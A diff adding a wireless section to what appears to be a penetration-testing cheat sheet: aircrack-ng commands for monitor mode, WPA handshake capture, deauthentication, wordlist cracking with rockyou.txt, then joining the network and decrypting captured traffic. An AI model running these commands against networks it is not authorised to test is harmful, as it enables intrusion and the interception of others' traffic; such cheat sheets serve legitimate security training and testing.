@@ -605,8 +605,72 @@ shell
 
 # Wireless
 
+list interfaces
 ```shell
+ip link show
+```
 
+activate monitor mode
+```shell
+airmon-ng start channel_name
+```
+
+packet capture
+```shell
+airodump-ng channel_name
+```
+
+## capture handshake
+
+start capture on channel 6
+```shell
+airodump-ng -c 6 --bssid bss_id -w outputfilename channel_name
+```
+
+force connection (Death)
+```shell
+aireplay-ng -0 10 -a bss_id channel_name
+```
+
+verify capture
+```shell
+airodump-ng channel_name -c 6 --essid network_name
+```
+
+crack handshake
+```shell
+aircrack-ng -w rockyou.txt outputfilename-01.cap
+```
+
+## Connect to network
+
+generate config file
+```shell
+wpa_passphrase "network_name" "password" > /tmp/network_name.conf
+```
+establish connection
+```shell
+wpa_supplicant -i wlan1 -c /tmp/network_name.conf -B -f /tmp/network_name.log
+```
+find network by name
+```shell
+iw dev wlan1 scan 2>/dev/null | grep -B2 -A2 network_name
+```
+check connection status
+```shell
+iw dev wlan1 link
+```
+request IP address via DHCP
+```shell
+dhclient -v wlan1
+```
+decrypt capture with key
+```shell
+airdecap-ng -p password outputfilename-01.cap -e network_name
+```
+analyze decrypted traffic
+```shell
+tcpdump -r outputfilename-01-dec.cap
 ```
 
 
